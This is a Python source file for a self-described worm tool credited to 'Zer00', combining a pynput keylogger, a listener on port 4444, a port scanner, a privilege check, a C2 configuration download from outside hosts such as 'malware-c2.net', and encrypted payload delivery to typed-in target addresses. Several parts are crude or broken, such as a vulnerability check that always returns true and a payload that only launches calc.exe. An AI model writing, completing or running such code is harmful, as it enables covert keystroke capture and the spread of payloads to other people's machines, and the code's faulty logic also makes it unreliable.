import os
import sys
import socket
import threading
import time
import random
import hashlib
import requests
import json
import ctypes
import subprocess
from urllib.request import urlopen
import urllib
import re
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# ASCII Art
ASCII_ART = """
__      _____  _ __ _ __ ___  _ _ __   __ _| | ___ | |
\ \ /\ / / _ \| '__| '_ ` _ \| | '_ \ / _` | |/ _ \| |
 \ V  V / (_) | |  | | | | | | | | | | (_| | | (_) | |
  \_/\_/ \___/|_|  |_| |_| |_|_|_| |_|\__, |_|\___/|_|
                                       __/ |          
                                      |___/           
(Made by Zer00)
                                      """

class Keylogger:
    def __init__(self, log_file="keylog.txt"):
        self.log_file = log_file
        self.keys = []
        
    def start(self):
        """Start keylogging thread"""
        self.thread = threading.Thread(target=self._capture_keys)
        self.thread.daemon = True
        self.thread.start()
        
    def _capture_keys(self):
        """Capture keystrokes"""
        try:
            import pynput.keyboard
            keyboard_listener = pynput.keyboard.Listener(
                on_press=self._on_key_press,
                on_release=self._on_key_release
            )
            keyboard_listener.start()
            keyboard_listener.join()
        except ImportError:
            # Fallback to alternative keylogging
            pass
            
    def _on_key_press(self, key):
        """Process key press events"""
        try:
            if hasattr(key, 'char'):
                self.keys.append(key.char)
            elif str(key) == 'Key.space':
                self.keys.append(' ')
            elif str(key) == 'Key.enter':
                self.keys.append('\n')
        except:
            pass
            
    def _on_key_release(self, key):
        """Process key release events"""
        pass
        
    def save_log(self):
        """Save captured keystrokes to file"""
        with open(self.log_file, 'w') as f:
            f.write(''.join(self.keys))
        return self.log_file

class PrivilegeEscalator:
    def __init__(self):
        self.vulnerabilities = {
            "Windows": self._check_windows_privs,
            "Linux": self._check_linux_privs
        }
        
    def detect_os(self):
        """Detect operating system"""
        if os.name == 'nt':
            return "Windows"
        else:
            return "Linux"
            
    def escalate(self):
        """Attempt privilege escalation"""
        os_type = self.detect_os()
        if os_type in self.vulnerabilities:
            return self.vulnerabilities[os_type]()
        return None
        
    def _check_windows_privs(self):
        """Check Windows privileges"""
        try:
            # Check for SeDebugPrivilege
            token = ctypes.windll.kernel32.OpenProcessToken(
                ctypes.windll.kernel32.GetCurrentProcess(),
                0x0002,  # TOKEN_QUERY
                ctypes.byref(ctypes.c_int())
            )
            if token:
                return "SeDebugPrivilege available"
            return "No privileged access"
        except:
            return "Privilege check failed"
            
    def _check_linux_privs(self):
        """Check Linux privileges"""
        try:
            output = subprocess.check_output(["id"])
            if b"uid=0(" in output:
                return "Root access detected"
            return "Standard user privileges"
        except:
            return "Privilege check failed"

def get_private_ip():
    """Get private IP address"""
    ip = socket.gethostbyname(socket.gethostname())
    return ip

def get_public_ip():
    """Get public IP address"""
    data = str(urlopen('http://checkip.dyndns.com/').read())
    return re.compile(r'Address: (\d+.\d+.\d+.\d+)').search(data).group(1)

def show_loading_bar(duration=5):
    """Display animated loading bar for specified duration"""
    chars = ["|", "/", "-", "\\"]
    start_time = time.time()
    
    while time.time() - start_time < duration:
        elapsed = time.time() - start_time
        progress = min(elapsed / duration, 1.0)
        percent = int(progress * 100)
        
        sys.stdout.write(f"\rLoading: {chars[int(elapsed*2) % len(chars)]} {percent}%")
        sys.stdout.flush()
        time.sleep(0.1)
    
    print("\nReady!")

def send_to(target, payload):
    """Send payload to target with error handling"""
    host, port = target.split(':')
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5)
            s.connect((host, int(port)))
            s.sendall(payload)
    except Exception as e:
        pass

def get_desktop_path():
    """Get user's desktop path"""
    return os.path.join(os.path.expanduser("~"), "Desktop")

class Listener:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.clients = []
        self.running = False
        
    def start(self):
        """Start listener thread"""
        self.running = True
        self.thread = threading.Thread(target=self._listen)
        self.thread.daemon = True
        self.thread.start()
        print(f"[+] Listener started on {self.host}:{self.port}")
        
    def _listen(self):
        """Listen for connections"""
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind((self.host, self.port))
            s.listen()
            while self.running:
                try:
                    conn, addr = s.accept()
                    self.clients.append(conn)
                    print(f"[+] Connection received from {addr[0]}:{addr[1]}")
                    threading.Thread(target=self._handle_client, args=(conn,)).start()
                except:
                    break
                    
    def _handle_client(self, conn):
        """Handle client connection"""
        while self.running:
            try:
                data = conn.recv(1024)
                if not data:
                    break
                print(f"[+] Received: {data.decode()}")
            except:
                break
                
    def stop(self):
        """Stop listener"""
        self.running = False
        for conn in self.clients:
            conn.close()
        print("[!] Listener stopped")

class AdvancedWorm:
    def __init__(self):
        self.key = os.urandom(32)
        self.iv = os.urandom(16)
        self.payloads = []
        self.targets = []
        self.c2_servers = [
            "c2.example.com",
            "malware-c2.net"
        ]
        self.desktop_path = get_desktop_path()
        self.listener = Listener()
        self.keylogger = Keylogger()
        self.priv_escalator = PrivilegeEscalator()
        
    def encrypt_payload(self, data):
        cipher = Cipher(algorithms.AES(self.key), modes.CFB8(self.iv), backend=default_backend())
        encryptor = cipher.encryptor()
        return encryptor.update(data) + encryptor.finalize()

    def execute_payload(self, payload):
        try:
            exec(payload)
        except Exception as e:
            pass

    def find_vulnerabilities(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            for port in range(1, 65535):
                try:
                    s.connect(('127.0.0.1', port))
                    if self.check_vuln(port):
                        self.targets.append(f'127.0.0.1:{port}')
                except:
                    continue

    def check_vuln(self, port):
        return True

    def download_c2_config(self):
        for server in self.c2_servers:
            try:
                resp = requests.get(f'https://{server}/config')
                if resp.status_code == 200:
                    config = json.loads(resp.text)
                    self.c2_servers = config['servers']
                    break
            except:
                continue

    def generate_payload(self):
        return f"""
import os
os.system('calc.exe')
"""

    def save_to_desktop(self, payload):
        """Save payload to user's desktop"""
        filename = os.path.join(self.desktop_path, f"worm_{random.randint(1000, 9999)}.py")
        with open(filename, 'wb') as f:
            f.write(payload)

    def detect_hacker_ip(self):
        """Detect hacker's IP address"""
        try:
            # Try to connect to known C2 servers
            for server in self.c2_servers:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((server, 4444))
                    hacker_ip = sock.getpeername()[0]
                    sock.close()
                    return hacker_ip
                except:
                    continue
            return None
        except:
            return None

    def main(self):
        print(ASCII_ART)
        
        # Get worm type selection
        print("\nSelect Worm Type:")
        print("1. Basic Worm")
        print("2. Advanced Worm")
        print("3. Stealth Worm")
        choice = input("Enter selection (1-3): ")
        
        # Show loading bar based on selection
        if choice == '1':
            print("\nInitializing Basic Worm...")
            show_loading_bar(3)
        elif choice == '2':
            print("\nInitializing Advanced Worm...")
            show_loading_bar(5)
        elif choice == '3':
            print("\nInitializing Stealth Worm...")
            show_loading_bar(7)
        else:
            print("\nInvalid selection. Using Basic Worm...")
            show_loading_bar(3)
        
        # Detect hacker IP and optimize listener
        hacker_ip = self.detect_hacker_ip()
        if hacker_ip:
            print(f"[+] Detected hacker at {hacker_ip}, optimizing listener...")
            self.listener = Listener(host=hacker_ip, port=4444)
        
        # Start listener
        self.listener.start()
        
        # Start keylogger
        self.keylogger.start()
        
        # Continue with worm initialization
        self.download_c2_config()
        self.find_vulnerabilities()
        
        # Attempt privilege escalation
        escalation_result = self.priv_escalator.escalate()
        if escalation_result:
            print(f"[+] Privilege escalation result: {escalation_result}")
        
        # Get menu input
        print("\nOptions:")
        print("1. Auto-send to desktop")
        print("2. Manual targeting")
        print("3. Save keylog")
        print("4. Exit")
        choice = input("Select option (1-4): ")
        
        if choice == '1':
            # Auto-send to desktop
            payload = self.encrypt_payload(self.generate_payload().encode())
            self.save_to_desktop(payload)
            print(f"Payload saved to {self.desktop_path}")
        elif choice == '2':
            # Manual targeting
            while True:
                target = input("Enter target IP:port (or 'q' to quit): ")
                if target.lower() == 'q':
                    break
                try:
                    send_to(target, self.encrypt_payload(self.generate_payload().encode()))
                except:
                    continue
        elif choice == '3':
            # Save keylog
            log_file = self.keylogger.save_log()
            print(f"[+] Keystrokes saved to {log_file}")
        elif choice == '4':
            # Stop listener and exit
            self.listener.stop()
            sys.exit()

if __name__ == '__main__':
    worm = AdvancedWorm()
    worm.main()